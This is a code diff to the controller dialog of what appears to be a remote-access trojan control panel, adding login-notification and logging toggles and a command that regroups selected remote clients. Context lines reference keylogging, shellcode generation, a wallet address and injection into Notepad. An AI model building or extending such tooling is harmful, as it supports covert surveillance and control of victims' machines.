@@ -558,6 +558,8 @@ BEGIN_MESSAGE_MAP(CMy2015RemoteDlg, CDialogEx)
     ON_COMMAND(ID_SHELLCODE_AES_C_ARRAY, &CMy2015RemoteDlg::OnShellcodeAesCArray)
     ON_COMMAND(ID_PARAM_KBLOGGER, &CMy2015RemoteDlg::OnParamKblogger)
         ON_COMMAND(ID_ONLINE_INJ_NOTEPAD, &CMy2015RemoteDlg::OnOnlineInjNotepad)
+        ON_COMMAND(ID_PARAM_LOGIN_NOTIFY, &CMy2015RemoteDlg::OnParamLoginNotify)
+        ON_COMMAND(ID_PARAM_ENABLE_LOG, &CMy2015RemoteDlg::OnParamEnableLog)
         END_MESSAGE_MAP()
 
 
@@ -1200,6 +1202,7 @@ BOOL CMy2015RemoteDlg::OnInitDialog()
     auto w = THIS_CFG.GetStr("settings", "wallet", "");
     memcpy(m_settings.WalletAddress, w.c_str(), w.length());
     m_settings.EnableKBLogger = THIS_CFG.GetInt("settings", "KeyboardLog", 0);
+    m_settings.EnableLog = THIS_CFG.GetInt("settings", "EnableLog", 0);
     CMenu* SubMenu = m_MainMenu.GetSubMenu(2);
     SubMenu->CheckMenuItem(ID_PARAM_KBLOGGER, m_settings.EnableKBLogger ? MF_CHECKED : MF_UNCHECKED);
     std::map<int, std::string> myMap = {{SOFTWARE_CAMERA, "摄像头"}, {SOFTWARE_TELEGRAM, "电报" }};
@@ -3856,7 +3859,18 @@ void CMy2015RemoteDlg::OnSelchangeGroupTab(NMHDR* pNMHDR, LRESULT* pResult)
 
 void CMy2015RemoteDlg::OnOnlineRegroup()
 {
-    TODO_NOTICE;
+    CInputDialog dlg(this);
+    dlg.Init("修改分组", "请输入分组名称:");
+    if (IDOK != dlg.DoModal()||dlg.m_str.IsEmpty()){
+        return;
+    }
+    if (dlg.m_str.GetLength() >= 24) {
+        MessageBoxA("分组名称长度不得超过24个字符!", "提示", MB_ICONINFORMATION);
+        return;
+    }
+    BYTE cmd[50] = { CMD_SET_GROUP };
+    memcpy(cmd + 1, dlg.m_str, dlg.m_str.GetLength());
+    SendSelectedCommand(cmd, sizeof(cmd));
 }
 
 
@@ -4237,4 +4251,24 @@ void CMy2015RemoteDlg::OnOnlineInjNotepad()
     }
     LeaveCriticalSection(&m_cs);
     SAFE_DELETE(tinyRun);
+}
+
+
+void CMy2015RemoteDlg::OnParamLoginNotify()
+{
+    static BOOL notify = THIS_CFG.GetInt("settings", "LoginNotify", 0);
+    notify = !notify;
+    THIS_CFG.SetInt("settings", "LoginNotify", notify);
+	CMenu* SubMenu = m_MainMenu.GetSubMenu(2);
+	SubMenu->CheckMenuItem(ID_PARAM_LOGIN_NOTIFY, notify ? MF_CHECKED : MF_UNCHECKED);
+}
+
+
+void CMy2015RemoteDlg::OnParamEnableLog()
+{
+    m_settings.EnableLog = !m_settings.EnableLog;
+	CMenu* SubMenu = m_MainMenu.GetSubMenu(2);
+	SubMenu->CheckMenuItem(ID_PARAM_ENABLE_LOG, m_settings.EnableLog ? MF_CHECKED : MF_UNCHECKED);
+	THIS_CFG.SetInt("settings", "EnableLog", m_settings.EnableLog);
+	SendMasterSettings(nullptr);
 }
